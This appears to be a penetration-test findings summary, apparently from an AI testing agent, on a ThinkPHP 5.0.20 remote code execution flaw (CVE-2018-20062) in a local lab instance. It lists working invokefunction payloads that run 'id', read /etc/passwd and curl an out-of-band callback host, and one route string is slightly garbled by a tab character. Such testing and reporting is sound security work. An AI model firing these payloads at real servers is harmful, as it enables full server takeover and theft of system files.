## Summary

The target at `http://127.0.0.1:8080` runs **ThinkPHP V5.0.20** on PHP 7.2.31 / Apache 2.4.38 (Debian). It is vulnerable to the well-known **ThinkPHP 5.x remote code execution** flaw (CVE-2018-20062), reachable via the `invokefunction` route.

**Confirmed and demonstrated (all against the live target):**
- `?s=/Index/	hink\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1` → full `phpinfo()` output.
- `vars[0]=system&vars[1][]=id` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)` (arbitrary OS command execution, output returned in response).
- `vars[0]=system&vars[1][]=cat /etc/passwd` → full `/etc/passwd` contents (sensitive file read, including `root:x:0:0:...`).
- `vars[0]=system&vars[1][]=curl http://host.docker.internal:60658/48e97934f085d7f44a8ba2795289680e/index.php` → executed successfully (returned "okok"), proving outbound code execution via the OOB callback.

This is a complete server-takeover: arbitrary command execution as `www-data` with the ability to read files and make outbound requests. The finding has been reported. No further distinct attack surface was present (this is a bare ThinkPHP framework install, not the multi-module DVWA layout), so testing is complete.
